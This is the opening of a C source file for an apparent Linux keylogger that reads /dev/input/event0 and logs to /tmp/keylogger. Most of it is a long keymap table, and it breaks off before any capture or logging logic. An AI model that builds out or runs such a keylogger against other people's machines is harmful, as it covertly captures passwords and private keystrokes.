#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <sys/stat.h>

#define LOGFILE "/tmp/keylogger"
#define KEYBOARD_STREAM "/dev/input/event0"

int keys_fd; // input event device file descriptor needs to be global for signal_handler(signum)
int log_fd;  // fd for LOGFILE

bool log_to_file = false;

// Format: { {"<key_name>", "<shifted_key_name>"}, { ... } ... }
char* keymap[][2] =
{
	{"[KEY_RESERVED]", "[SHIFT+KEY_RESERVED]"}, {"[ESCAPE]", "[SHIFT+ESCAPE]"},
	{"1", "!"}, {"2", "@"}, {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"},
	{"[BACKSPACE]", "[SHIFT+BACKSPACE]"}, {"[TAB]", "[SHIFT+TAB]"}, 
	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"}, {"o", "O"}, {"p", "P"},
	{"[", "{"}, {"]", "}"}, {"\n", "\n"}, {"[LCTRL]", "[SHIFT+LCTRL]"},
	{"a", "A"}, {"s", "S"}, {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
	{";", ":"}, {"'", "\""},
	{"`", "~"}, {"[LSHIFT]", "[LSHIFT]"}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, {"b", "B"}, {"n", "N"}, {"m", "M"},
	{",", "<"}, {".", ">"}, {"/", "?"}, {"[RSHIFT]", "[RSHIFT]"},
	{"[KPASTERISK]", "[KPASTERISK]"}, {"[LALT]", "[SHIFT+LALT]"}, {" ", " "}, {"[CAPSLOCK]", "[SHIFT+CAPSLOCK]"},
	{"[F1]", "[SHIFT+F1]"}, {"[F2]", "[SHIFT+F2]"}, {"[F3]", "[SHIFT+F3]"}, {"[F4]", "[SHIFT+F4]"}, {"[F5]", "[SHIFT+F5]"}, {"[F6]", "[SHIFT+F6]"}, {"[F7]", "[SHIFT+F7]"}, {"[F8]", "[SHIFT+F8]"}, {"[F9]", "[SHIFT+F9]"}, {"[F10]", "[SHIFT+F10]"}, 
	{"[NUMLOCK]", "[SHIFT+NUMLOCK]"}, {"[SCROLLLOCK]", "[SHIFT+SCROLLLOCK]"},
	{"[KP7]", "[SHIFT+KP7]"}, {"[KP8]", "[SHIFT+KP8]"}, {"[KP9]", "[SHIFT+KP9]"},
	{"[KPMINUS]", "[SHIFT+KPMINUS]"}, 
	{"[KP4]", "[SHIFT+KP4]"}, {"[KP5]", "[SHIFT+KP5]"}, {"[KP6]", "[SHIFT+KP6]"}, 
	{"[KPPLUS]", "[SHIFT+KPPLUS]"},
	{"[KP1]", "[SHIFT+KP1]"}, {"[KP2]", "[SHIFT+KP2]"}, {"[KP3]", "[SHIFT+KP3]"}, {"[KP0]", "[SHIFT+KP0]"},  
	{"[KPDOT]", "[SHIFT+KPTDOT]"}, {"[ZENKAHUHANKAKU]", "[SHIFT+ZENKAHUHANKAKU]"}, {"[102ND]", "[SHIFT+102ND]"},
	{"[F11]", "[SHIFT+F11]"}, {"[F12]", "[SHIFT+F12]"},
	{"[KEY_F12]", "[SHIFT+KEY_F12]"}, 
	{"[KEY_RO]", "[SHIFT+KEY_RO]"}, 
	{"[KEY_KATAKANA]", "[SHIFT+KEY_KATAKANA]"}, 
	{"[KEY_HIRAGANA]", "[SHIFT+KEY_HIRAGANA]"}, 
	{"[KEY_HENKAN]", "[SHIFT+KEY_HENKAN]"}, 
	{"[KEY_KATAKANAHIRAGANA]", "[SHIFT+KEY_KATAKANAHIRAGANA]"}, 
	{"[KEY_MUHENKAN]", "[SHIFT+KEY_MUHENKAN]"}, 
	{"[KEY_KPJPCOMMA]", "[SHIFT+KEY_KPJPCOMMA]"}, 
	{"[KEY_KPENTER]", "[SHIFT+KEY_KPENTER]"}, 
	{"[KEY_RIGHTCTRL]", "[SHIFT+KEY_RIGHTCTRL]"}, 
	{"[KEY_KPSLASH]", "[SHIFT+KEY_KPSLASH]"}, 
	{"[KEY_SYSRQ]", "[SHIFT+KEY_SYSRQ]"}, 
	{"[KEY_RIGHTALT]", "[SHIFT+KEY_RIGHTALT]"}, 
	{"[KEY_LINEFEED]", "[SHIFT+KEY_LINEFEED]"}, 
	{"[KEY_HOME]", "[SHIFT+KEY_HOME]"}, 
	{"[KEY_UP]", "[SHIFT+KEY_UP]"}, 
	{"[KEY_PAGEUP]", "[SHIFT+KEY_PAGEUP]"}, 
	{"[KEY_LEFT]", "[SHIFT+KEY_LEFT]"}, 
	{"[KEY_RIGHT]", "[SHIFT+KEY_RIGHT]"}, 
	{"[KEY_END]", "[SHIFT+KEY_END]"}, 
	{"[KEY_DOWN]", "[SHIFT+KEY_DOWN]"}, 
	{"[KEY_PAGEDOWN]", "[SHIFT+KEY_PAGEDOWN]"}, 
	{"[KEY_INSERT]", "[SHIFT+KEY_INSERT]"}, 
	{"[KEY_DELETE]", "[SHIFT+KEY_DELETE]"}, 
	{"[KEY_MACRO]", "[SHIFT+KEY_MACRO]"}, 
	{"[KEY_MUTE]", "[SHIFT+KEY_MUTE]"}, 
	{"[KEY_VOLUMEDOWN]", "[SHIFT+KEY_VOLUMEDOWN]"}, 
	{"[KEY_VOLUMEUP]", "[SHIFT+KEY_VOLUMEUP]"}, 
	{"[KEY_POWER]", "[SHIFT+KEY_POWER]"}, 
	{"[KEY_KPEQUAL]", "[SHIFT+KEY_KPEQUAL]"}, 
	{"[KEY_KPPLUSMINUS]", "[SHIFT+KEY_KPPLUSMINUS]"}, 
	{"[KEY_PAUSE]", "[SHIFT+KEY_PAUSE]"}, 
	{"[KEY_SCALE]", "[SHIFT+KEY_SCALE]"}, 
	{"[KEY_KPCOMMA]", "[SHIFT+KEY_KPCOMMA]"}, 
	{"[KEY_HANGEUL]", "[SHIFT+KEY_HANGEUL]"}, 
	{"[KEY_HANGUEL]", "[SHIFT+KEY_HANGUEL]"}, 
	{"[KEY_HANJA]", "[SHIFT+KEY_HANJA]"}, 
	{"[KEY_YEN]", "[SHIFT+KEY_YEN]"}, 
	{"[KEY_LEFTMETA]", "[SHIFT+KEY_LEFTMETA]"}, 
	{"[KEY_RIGHTMETA]", "[SHIFT+KEY_RIGHTMETA]"}, 
	{"[KEY_COMPOSE]", "[SHIFT+KEY_COMPOSE]"}, 
	{"[KEY_STOP]", "[SHIFT+KEY_STOP]"}, 
	{"[KEY_AGAIN]", "[SHIFT+KEY_AGAIN]"}, 
	{"[KEY_PROPS]", "[SHIFT+KEY_PROPS]"}, 
	{"[KEY_UNDO]", "[SHIFT+KEY_UNDO]"}, 
	{"[KEY_FRONT]", "[SHIFT+KEY_FRONT]"}, 
	{"[KEY_COPY]", "[SHIFT+KEY_COPY]"}, 
	{"[KEY_OPEN]", "[SHIFT+KEY_OPEN]"}, 
	{"[KEY_PASTE]", "[SHIFT+KEY_PASTE]"}, 
	{"[KEY_FIND]", "[SHIFT+KEY_FIND]"}, 
	{"[KEY_CUT]", "[SHIFT+KEY_CUT]"}, 
	{"[KEY_HELP]", "[SHIFT+KEY_HELP]"}, 
	{"[KEY_MENU]", "[SHIFT+KEY_MENU]"}, 
	{"[KEY_CALC]", "[SHIFT+KEY_CALC]"}, 
	{"[KEY_SETUP]", "[SHIFT+KEY_SETUP]"}, 
	{"[KEY_SLEEP]", "[SHIFT+KEY_SLEEP]"}, 
	{"[KEY_WAKEUP]", "[SHIFT+KEY_WAKEUP]"}, 
	{"[KEY_FILE]", "[SHIFT+KEY_FILE]"}, 
	{"[KEY_SENDFILE]", "[SHIFT+KEY_SENDFILE]"}, 
	{"[KEY_DELETEFILE]", "[SHIFT+KEY_DELETEFILE]"}, 
	{"[KEY_XFER]", "[SHIFT+KEY_XFER]"}, 
	{"[KEY_PROG1]", "[SHIFT+KEY_PROG1]"}, 
	{"[KEY_PROG2]", "[SHIFT+KEY_PROG2]"}, 
	{"[KEY_WWW]", "[SHIFT+KEY_WWW]"}, 
	{"[KEY_MSDOS]", "[SHIFT+KEY_MSDOS]"}, 
	{"[KEY_COFFEE]", "[SHIFT+KEY_COFFEE]"}, 
	{"[KEY_SCREENLOCK]", "[SHIFT+KEY_SCREENLOCK]"}, 
	{"[KEY_ROTATE_DISPLAY]", "[SHIFT+KEY_ROTATE_DISPLAY]"}, 
	{"[KEY_DIRECTION]", "[SHIFT+KEY_DIRECTION]"}, 
	{"[KEY_CYCLEWINDOWS]", "[SHIFT+KEY_CYCLEWINDOWS]"}, 
	{"[KEY_MAIL]", "[SHIFT+KEY_MAIL]"}, 
	{"[KEY_BOOKMARKS]", "[SHIFT+KEY_BOOKMARKS]"}, 
	{"[KEY_COMPUTER]", "[SHIFT+KEY_COMPUTER]"}, 
	{"[KEY_BACK]", "[SHIFT+KEY_BACK]"}, 
	{"[KEY_FORWARD]", "[SHIFT+KEY_FORWARD]"}, 
	{"[KEY_CLOSECD]", "[SHIFT+KEY_CLOSECD]"}, 
	{"[KEY_EJECTCD]", "[SHIFT+KEY_EJECTCD]"}, 
	{"[KEY_EJECTCLOSECD]", "[SHIFT+KEY_EJECTCLOSECD]"}, 
	{"[KEY_NEXTSONG]", "[SHIFT+KEY_NEXTSONG]"}, 
	{"[KEY_PLAYPAUSE]", "[SHIFT+KEY_PLAYPAUSE]"}, 
	{"[KEY_PREVIOUSSONG]", "[SHIFT+KEY_PREVIOUSSONG]"}, 
	{"[KEY_STOPCD]", "[SHIFT+KEY_STOPCD]"}, 
	{"[KEY_RECORD]", "[SHIFT+KEY_RECORD]"}, 
	{"[KEY_REWIND]", "[SHIFT+KEY_REWIND]"}, 
	{"[KEY_PHONE]", "[SHIFT+KEY_PHONE]"}, 
	{"[KEY_ISO]", "[SHIFT+KEY_ISO]"}, 
	{"[KEY_CONFIG]", "[SHIFT+KEY_CONFIG]"}, 
	{"[KEY_HOMEPAGE]", "[SHIFT+KEY_HOMEPAGE]"}, 
	{"[KEY_REFRESH]", "[SHIFT+KEY_REFRESH]"}, 
	{"[KEY_EXIT]", "[SHIFT+KEY_EXIT]"}, 
	{"[KEY_MOVE]", "[SHIFT+KEY_MOVE]"}, 
	{"[KEY_EDIT]", "[SHIFT+KEY_EDIT]"}, 
	{"[KEY_SCROLLUP]", "[SHIFT+KEY_SCROLLUP]"}, 
	{"[KEY_SCROLLDOWN]", "[SHIFT+KEY_SCROLLDOWN]"}, 
	{"[KEY_KPLEFTPAREN]", "[SHIFT+KEY_KPLEFTPAREN]"}, 
	{"[KEY_KPRIGHTPAREN]", "[SHIFT+KEY_KPRIGHTPAREN]"}, 
	{"[KEY_NEW]", "[SHIFT+KEY_NEW]"}, 
	{"[KEY_REDO]", "[SHIFT+KEY_REDO]"}, 
	{"[KEY_F13]", "[SHIFT+KEY_F13]"}, 
	{"[KEY_F14]", "[SHIFT+KEY_F14]"}, 
	{"[KEY_F15]", "[SHIFT+KEY_F15]"}, 
	{"[KEY_F16]", "[SHIFT+KEY_F16]"}, 
	{"[KEY_F17]", "[SHIFT+KEY_F17]"}, 
	{"[KEY_F18]", "[SHIFT+KEY_F18]"}, 
	{"[KEY_F19]", "[SHIFT+KEY_F19]"}, 
	{"[KEY_F20]", "[SHIFT+KEY_F20]"}, 
	{"[KEY_F21]", "[SHIFT+KEY_F21]"}, 
	{"[KEY_F22]", "[SHIFT+KEY_F22]"}, 
	{"[KEY_F23]", "[SHIFT+KEY_F23]"}, 
	{"[KEY_F24]", "[SHIFT+KEY_F24]"}, 
	{"[KEY_PLAYCD]", "[SHIFT+KEY_PLAYCD]"}, 
	{"[KEY_PAUSECD]", "[SHIFT+KEY_PAUSECD]"}, 
	{"[KEY_PROG3]", "[SHIFT+KEY_PROG3]"}, 
	{"[KEY_PROG4]", "[SHIFT+KEY_PROG4]"}, 
	{"[KEY_DASHBOARD]", "[SHIFT+KEY_DASHBOARD]"}, 
	{"[KEY_SUSPEND]", "[SHIFT+KEY_SUSPEND]"}, 
	{"[KEY_CLOSE]", "[SHIFT+KEY_CLOSE]"}, 
	{"[KEY_PLAY]", "[SHIFT+KEY_PLAY]"}, 
	{"[KEY_FASTFORWARD]", "[SHIFT+KEY_FASTFORWARD]"}, 
	{"[KEY_BASSBOOST]", "[SHIFT+KEY_BASSBOOST]"}, 
	{"[KEY_PRINT]", "[SHIFT+KEY_PRINT]"}, 
	{"[KEY_HP]", "[SHIFT+KEY_HP]"}, 
	{"[KEY_CAMERA]", "[SHIFT+KEY_CAMERA]"}, 
	{"[KEY_SOUND]", "[SHIFT+KEY_SOUND]"}, 
	{"[KEY_QUESTION]", "[SHIFT+KEY_QUESTION]"}, 
	{"[KEY_EMAIL]", "[SHIFT+KEY_EMAIL]"}, 
	{"[KEY_CHAT]", "[SHIFT+KEY_CHAT]"}, 
	{"[KEY_SEARCH]", "[SHIFT+KEY_SEARCH]"}, 
	{"[KEY_CONNECT]", "[SHIFT+KEY_CONNECT]"}, 
	{"[KEY_FINANCE]", "[SHIFT+KEY_FINANCE]"}, 
	{"[KEY_SPORT]", "[SHIFT+KEY_SPORT]"}, 
	{"[KEY_SHOP]", "[SHIFT+KEY_SHOP]"}, 
	{"[KEY_ALTERASE]", "[SHIFT+KEY_ALTERASE]"}, 
	{"[KEY_CANCEL]", "[SHIFT+KEY_CANCEL]"}, 
	{"[KEY_BRIGHTNESSDOWN]", "[SHIFT+KEY_BRIGHTNESSDOWN]"}, 
	{"[KEY_BRIGHTNESSUP]", "[SHIFT+KEY_BRIGHTNESSUP]"}, 
	{"[KEY_MEDIA]", "[SHIFT+KEY_MEDIA]"}, 
	{"[KEY_SWITCHVIDEOMODE]", "[SHIFT+KEY_SWITCHVIDEOMODE]"}, 
	{"[KEY_KBDILLUMTOGGLE]", "[SHIFT+KEY_KBDILLUMTOGGLE]"}, 
	{"[KEY_KBDILLUMDOWN]", "[SHIFT+KEY_KBDILLUMDOWN]"}, 
	{"[KEY_KBDILLUMUP]", "[SHIFT+KEY_KBDILLUMUP]"}, 
	{"[KEY_SEND]", "[SHIFT+KEY_SEND]"}, 
	{"[KEY_REPLY]", "[SHIFT+KEY_REPLY]"}, 
	{"[KEY_FORWARDMAIL]", "[SHIFT+KEY_FORWARDMAIL]"}, 
	{"[KEY_SAVE]", "[SHIFT+KEY_SAVE]"}, 
	{"[KEY_DOCUMENTS]", "[SHIFT+KEY_DOCUMENTS]"}, 
	{"[KEY_BATTERY]", "[SHIFT+KEY_BATTERY]"}, 
	{"[KEY_BLUETOOTH]", "[SHIFT+KEY_BLUETOOTH]"}, 
	{"[KEY_WLAN]", "[SHIFT+KEY_WLAN]"}, 
	{"[KEY_UWB]", "[SHIFT+KEY_UWB]"}, 
	{"[KEY_UNKNOWN]", "[SHIFT+KEY_UNKNOWN]"}, 
	{"[KEY_VIDEO_NEXT]", "[SHIFT+KEY_VIDEO_NEXT]"}, 
	{"[KEY_VIDEO_PREV]", "[SHIFT+KEY_VIDEO_PREV]"}, 
	{"[KEY_BRIGHTNESS_CYCLE]", "[SHIFT+KEY_BRIGHTNESS_CYCLE]"}, 
	{"[KEY_BRIGHTNESS_AUTO]", "[SHIFT+KEY_BRIGHTNESS_AUTO]"}, 
	{"[KEY_BRIGHTNESS_ZERO]", "[SHIFT+KEY_BRIGHTNESS_ZERO]"}, 
	{"[KEY_DISPLAY_OFF]", "[SHIFT+KEY_DISPLAY_OFF]"}, 
	{"[KEY_WWAN]", "[SHIFT+KEY_WWAN]"}, 
	{"[KEY_WIMAX]", "[SHIFT+KEY_WIMAX]"}, 
	{"[KEY_RFKILL]", "[SHIFT+KEY_RFKILL]"}, 
	{"[KEY_MICMUTE]", "[SHIFT+KEY_MICMUTE]"}, 
	{"[KEY_OK]", "[SHIFT+KEY_OK]"}, 
	{"[KEY_SELECT]", "[SHIFT+KEY_SELECT]"}, 
	{"[KEY_GOTO]", "[SHIFT+KEY_GOTO]"}, 
	{"[KEY_CLEAR]", "[SHIFT+KEY_CLEAR]"}, 
	{"[KEY_POWER2]", "[SHIFT+KEY_POWER2]"}, 
	{"[KEY_OPTION]", "[SHIFT+KEY_OPTION]"}, 
	{"[KEY_INFO]", "[SHIFT+KEY_INFO]"}, 
	{"[KEY_TIME]", "[SHIFT+KEY_TIME]"}, 
	{"[KEY_VENDOR]", "[SHIFT+KEY_VENDOR]"}, 
	{"[KEY_ARCHIVE]", "[SHIFT+KEY_ARCHIVE]"}, 
	{"[KEY_PROGRAM]", "[SHIFT+KEY_PROGRAM]"}, 
	{"[KEY_CHANNEL]", "[SHIFT+KEY_CHANNEL]"}, 
	{"[KEY_FAVORITES]", "[SHIFT+KEY_FAVORITES]"}, 
	{"[KEY_EPG]", "[SHIFT+KEY_EPG]"}, 
	{"[KEY_PVR]", "[SHIFT+KEY_PVR]"}, 
	{"[KEY_MHP]", "[SHIFT+KEY_MHP]"}, 
	{"[KEY_LANGUAGE]", "[SHIFT+KEY_LANGUAGE]"}, 
	{"[KEY_TITLE]", "[SHIFT+KEY_TITLE]"}, 
	{"[KEY_SUBTITLE]", "[SHIFT+KEY_SUBTITLE]"}, 
	{"[KEY_ANGLE]", "[SHIFT+KEY_ANGLE]"}, 
	{"[KEY_FULL_SCREEN]", "[SHIFT+KEY_FULL_SCREEN]"}, 
	{"[KEY_ZOOM]", "[SHIFT+KEY_ZOOM]"}, 
	{"[KEY_MODE]", "[SHIFT+KEY_MODE]"}, 
	{"[KEY_KEYBOARD]", "[SHIFT+KEY_KEYBOARD]"}, 
	{"[KEY_ASPECT_RATIO]", "[SHIFT+KEY_ASPECT_RATIO]"}, 
	{"[KEY_SCREEN]", "[SHIFT+KEY_SCREEN]"}, 
	{"[KEY_PC]", "[SHIFT+KEY_PC]"}, 
	{"[KEY_TV]", "[SHIFT+KEY_TV]"}, 
	{"[KEY_TV2]", "[SHIFT+KEY_TV2]"}, 
	{"[KEY_VCR]", "[SHIFT+KEY_VCR]"}, 
	{"[KEY_VCR2]", "[SHIFT+KEY_VCR2]"}, 
	{"[KEY_SAT]", "[SHIFT+KEY_SAT]"}, 
	{"[KEY_SAT2]", "[SHIFT+KEY_SAT2]"}, 
	{"[KEY_CD]", "[SHIFT+KEY_CD]"}, 
	{"[KEY_TAPE]", "[SHIFT+KEY_TAPE]"}, 
	{"[KEY_RADIO]", "[SHIFT+KEY_RADIO]"}, 
	{"[KEY_TUNER]", "[SHIFT+KEY_TUNER]"}, 
	{"[KEY_PLAYER]", "[SHIFT+KEY_PLAYER]"}, 
	{"[KEY_TEXT]", "[SHIFT+KEY_TEXT]"}, 
	{"[KEY_DVD]", "[SHIFT+KEY_DVD]"}, 
	{"[KEY_AUX]", "[SHIFT+KEY_AUX]"}, 
	{"[KEY_MP3]", "[SHIFT+KEY_MP3]"}, 
	{"[KEY_AUDIO]", "[SHIFT+KEY_AUDIO]"}, 
	{"[KEY_VIDEO]", "[SHIFT+KEY_VIDEO]"}, 
	{"[KEY_DIRECTORY]", "[SHIFT+KEY_DIRECTORY]"}, 
	{"[KEY_LIST]", "[SHIFT+KEY_LIST]"}, 
	{"[KEY_MEMO]", "[SHIFT+KEY_MEMO]"}, 
	{"[KEY_CALENDAR]", "[SHIFT+KEY_CALENDAR]"}, 
	{"[KEY_RED]", "[SHIFT+KEY_RED]"}, 
	{"[KEY_GREEN]", "[SHIFT+KEY_GREEN]"}, 
	{"[KEY_YELLOW]", "[SHIFT+KEY_YELLOW]"}, 
	{"[KEY_BLUE]", "[SHIFT+KEY_BLUE]"}, 
	{"[KEY_CHANNELUP]", "[SHIFT+KEY_CHANNELUP]"}, 
	{"[KEY_CHANNELDOWN]", "[SHIFT+KEY_CHANNELDOWN]"}, 
	{"[KEY_FIRST]", "[SHIFT+KEY_FIRST]"}, 
	{"[KEY_LAST]", "[SHIFT+KEY_LAST]"}, 
	{"[KEY_AB]", "[SHIFT+KEY_AB]"}, 
	{"[KEY_NEXT]", "[SHIFT+KEY_NEXT]"}, 
	{"[KEY_RESTART]", "[SHIFT+KEY_RESTART]"}, 
	{"[KEY_SLOW]", "[SHIFT+KEY_SLOW]"}, 
	{"[KEY_SHUFFLE]", "[SHIFT+KEY_SHUFFLE]"}, 
	{"[KEY_BREAK]", "[SHIFT+KEY_BREAK]"}, 
	{"[KEY_PREVIOUS]", "[SHIFT+KEY_PREVIOUS]"}, 
	{"[KEY_DIGITS]", "[SHIFT+KEY_DIGITS]"}, 
	{"[KEY_TEEN]", "[SHIFT+KEY_TEEN]"}, 
	{"[KEY_TWEN]", "[SHIFT+KEY_TWEN]"}, 
	{"[KEY_VIDEOPHONE]", "[SHIFT+KEY_VIDEOPHONE]"}, 
	{"[KEY_GAMES]", "[SHIFT+KEY_GAMES]"}, 
	{"[KEY_ZOOMIN]", "[SHIFT+KEY_ZOOMIN]"}, 
	{"[KEY_ZOOMOUT]", "[SHIFT+KEY_ZOOMOUT]"}, 
	{"[KEY_ZOOMRESET]", "[SHIFT+KEY_ZOOMRESET]"}, 
	{"[KEY_WORDPROCESSOR]", "[SHIFT+KEY_WORDPROCESSOR]"}, 
	{"[KEY_EDITOR]", "[SHIFT+KEY_EDITOR]"}, 
	{"[KEY_SPREADSHEET]", "[SHIFT+KEY_SPREADSHEET]"}, 
	{"[KEY_GRAPHICSEDITOR]", "[SHIFT+KEY_GRAPHICSEDITOR]"}, 
	{"[KEY_PRESENTATION]", "[SHIFT+KEY_PRESENTATION]"}, 
	{"[KEY_DATABASE]", "[SHIFT+KEY_DATABASE]"}, 
	{"[KEY_NEWS]", "[SHIFT+KEY_NEWS]"}, 
	{"[KEY_VOICEMAIL]", "[SHIFT+KEY_VOICEMAIL]"}, 
	{"[KEY_ADDRESSBOOK]", "[SHIFT+KEY_ADDRESSBOOK]"}, 
	{"[KEY_MESSENGER]", "[SHIFT+KEY_MESSENGER]"}, 
	{"[KEY_DISPLAYTOGGLE]", "[SHIFT+KEY_DISPLAYTOGGLE]"}, 
	{"[KEY_BRIGHTNESS_TOGGLE]", "[SHIFT+KEY_BRIGHTNESS_TOGGLE]"}, 
	{"[KEY_SPELLCHECK]", "[SHIFT+KEY_SPELLCHECK]"}, 
	{"[KEY_LOGOFF]", "[SHIFT+KEY_LOGOFF]"}, 
	{"[KEY_DOLLAR]", "[SHIFT+KEY_DOLLAR]"}, 
	{"[KEY_EURO]", "[SHIFT+KEY_EURO]"}, 
	{"[KEY_FRAMEBACK]", "[SHIFT+KEY_FRAMEBACK]"}, 
	{"[KEY_FRAMEFORWARD]", "[SHIFT+KEY_FRAMEFORWARD]"}, 
	{"[KEY_CONTEXT_MENU]", "[SHIFT+KEY_CONTEXT_MENU]"}, 
	{"[KEY_MEDIA_REPEAT]", "[SHIFT+KEY_MEDIA_REPEAT]"}, 
	{"[KEY_10CHANNELSUP]", "[SHIFT+KEY_10CHANNELSUP]"}, 
	{"[KEY_10CHANNELSDOWN]", "[SHIFT+KEY_10CHANNELSDOWN]"}, 
	{"[KEY_IMAGES]", "[SHIFT+KEY_IMAGES]"}, 
	{"[KEY_NOTIFICATION_CENTER]", "[SHIFT+KEY_NOTIFICATION_CENTER]"}, 
	{"[KEY_PICKUP_PHONE]", "[SHIFT+KEY_PICKUP_PHONE]"}, 
	{"[KEY_HANGUP_PHONE]", "[SHIFT+KEY_HANGUP_PHONE]"}, 
	{"[KEY_DEL_EOL]", "[SHIFT+KEY_DEL_EOL]"}, 
	{"[KEY_DEL_EOS]", "[SHIFT+KEY_DEL_EOS]"}, 
	{"[KEY_INS_LINE]", "[SHIFT+KEY_INS_LINE]"}, 
	{"[KEY_DEL_LINE]", "[SHIFT+KEY_DEL_LINE]"}, 
	{"[KEY_FN]", "[SHIFT+KEY_FN]"}, 
	{"[KEY_FN_ESC]", "[SHIFT+KEY_FN_ESC]"}, 
	{"[KEY_FN_F1]", "[SHIFT+KEY_FN_F1]"}, 
	{"[KEY_FN_F2]", "[SHIFT+KEY_FN_F2]"}, 
	{"[KEY_FN_F3]", "[SHIFT+KEY_FN_F3]"}, 
	{"[KEY_FN_F4]", "[SHIFT+KEY_FN_F4]"}, 
	{"[KEY_FN_F5]", "[SHIFT+KEY_FN_F5]"}, 
	{"[KEY_FN_F6]", "[SHIFT+KEY_FN_F6]"}, 
	{"[KEY_FN_F7]", "[SHIFT+KEY_FN_F7]"}, 
	{"[KEY_FN_F8]", "[SHIFT+KEY_FN_F8]"}, 
	{"[KEY_FN_F9]", "[SHIFT+KEY_FN_F9]"}, 
	{"[KEY_FN_F10]", "[SHIFT+KEY_FN_F10]"}, 
	{"[KEY_FN_F11]", "[SHIFT+KEY_FN_F11]"}, 
	{"[KEY_FN_F12]", "[SHIFT+KEY_FN_F12]"}, 
	{"[KEY_FN_1]", "[SHIFT+KEY_FN_1]"}, 
	{"[KEY_FN_2]", "[SHIFT+KEY_FN_2]"}, 
	{"[KEY_FN_D]", "[SHIFT+KEY_FN_D]"}, 
	{"[KEY_FN_E]", "[SHIFT+KEY_FN_E]"}, 
	{"[KEY_FN_F]", "[SHIFT+KEY_FN_F]"}, 
	{"[KEY_FN_S]", "[SHIFT+KEY_FN_S]"}, 
	{"[KEY_FN_B]", "[SHIFT+KEY_FN_B]"}, 
	{"[KEY_FN_RIGHT_SHIFT]", "[SHIFT+KEY_FN_RIGHT_SHIFT]"}, 
	{"[KEY_BRL_DOT1]", "[SHIFT+KEY_BRL_DOT1]"}, 
	{"[KEY_BRL_DOT2]", "[SHIFT+KEY_BRL_DOT2]"}, 
	{"[KEY_BRL_DOT3]", "[SHIFT+KEY_BRL_DOT3]"}, 
	{"[KEY_BRL_DOT4]", "[SHIFT+KEY_BRL_DOT4]"}, 
	{"[KEY_BRL_DOT5]", "[SHIFT+KEY_BRL_DOT5]"}, 
	{"[KEY_BRL_DOT6]", "[SHIFT+KEY_BRL_DOT6]"}, 
	{"[KEY_BRL_DOT7]", "[SHIFT+KEY_BRL_DOT7]"}, 
	{"[KEY_BRL_DOT8]", "[SHIFT+KEY_BRL_DOT8]"}, 
	{"[KEY_BRL_DOT9]", "[SHIFT+KEY_BRL_DOT9]"}, 
	{"[KEY_BRL_DOT10]", "[SHIFT+KEY_BRL_DOT10]"}, 
	{"[KEY_NUMERIC_0]", "[SHIFT+KEY_NUMERIC_0]"}, 
	{"[KEY_NUMERIC_1]", "[SHIFT+KEY_NUMERIC_1]"}, 
	{"[KEY_NUMERIC_2]", "[SHIFT+KEY_NUMERIC_2]"}, 
	{"[KEY_NUMERIC_3]", "[SHIFT+KEY_NUMERIC_3]"}, 
	{"[KEY_NUMERIC_4]", "[SHIFT+KEY_NUMERIC_4]"}, 
	{"[KEY_NUMERIC_5]", "[SHIFT+KEY_NUMERIC_5]"}, 
	{"[KEY_NUMERIC_6]", "[SHIFT+KEY_NUMERIC_6]"}, 
	{"[KEY_NUMERIC_7]", "[SHIFT+KEY_NUMERIC_7]"}, 
	{"[KEY_NUMERIC_8]", "[SHIFT+KEY_NUMERIC_8]"}, 
	{"[KEY_NUMERIC_9]", "[SHIFT+KEY_NUMERIC_9]"}, 
	{"[KEY_NUMERIC_STAR]", "[SHIFT+KEY_NUMERIC_STAR]"}, 
	{"[KEY_NUMERIC_POUND]", "[SHIFT+KEY_NUMERIC_POUND]"}, 
	{"[KEY_NUMERIC_A]", "[SHIFT+KEY_NUMERIC_A]"}, 
	{"[KEY_NUMERIC_B]", "[SHIFT+KEY_NUMERIC_B]"}, 
	{"[KEY_NUMERIC_C]", "[SHIFT+KEY_NUMERIC_C]"}, 
	{"[KEY_NUMERIC_D]", "[SHIFT+KEY_NUMERIC_D]"}, 
	{"[KEY_CAMERA_FOCUS]", "[SHIFT+KEY_CAMERA_FOCUS]"}, 
	{"[KEY_WPS_BUTTON]", "[SHIFT+KEY_WPS_BUTTON]"}, 
	{"[KEY_TOUCHPAD_TOGGLE]", "[SHIFT+KEY_TOUCHPAD_TOGGLE]"}, 
	{"[KEY_TOUCHPAD_ON]", "[SHIFT+KEY_TOUCHPAD_ON]"}, 
	{"[KEY_TOUCHPAD_OFF]", "[SHIFT+KEY_TOUCHPAD_OFF]"}, 
	{"[KEY_CAMERA_ZOOMIN]", "[SHIFT+KEY_CAMERA_ZOOMIN]"}, 
	{"[KEY_CAMERA_ZOOMOUT]", "[SHIFT+KEY_CAMERA_ZOOMOUT]"}, 
	{"[KEY_CAMERA_UP]", "[SHIFT+KEY_CAMERA_UP]"}, 
	{"[KEY_CAMERA_DOWN]", "[SHIFT+KEY_CAMERA_DOWN]"}, 
	{"[KEY_CAMERA_LEFT]", "[SHIFT+KEY_CAMERA_LEFT]"}, 
	{"[KEY_CAMERA_RIGHT]", "[SHIFT+KEY_CAMERA_RIGHT]"}, 
	{"[KEY_ATTENDANT_ON]", "[SHIFT+KEY_ATTENDANT_ON]"}, 
	{"[KEY_ATTENDANT_OFF]", "[SHIFT+KEY_ATTENDANT_OFF]"}, 
	{"[KEY_ATTENDANT_TOGGLE]", "[SHIFT+KEY_ATTENDANT_TOGGLE]"}, 
	{"[KEY_LIGHTS_TOGGLE]", "[SHIFT+KEY_LIGHTS_TOGGLE]"}, 
	{"[KEY_ALS_TOGGLE]", "[SHIFT+KEY_ALS_TOGGLE]"}, 
	{"[KEY_ROTATE_LOCK_TOGGLE]", "[SHIFT+KEY_ROTATE_LOCK_TOGGLE]"}, 
	{"[KEY_BUTTONCONFIG]", "[SHIFT+KEY_BUTTONCONFIG]"}, 
	{"[KEY_TASKMANAGER]", "[SHIFT+KEY_TASKMANAGER]"}, 
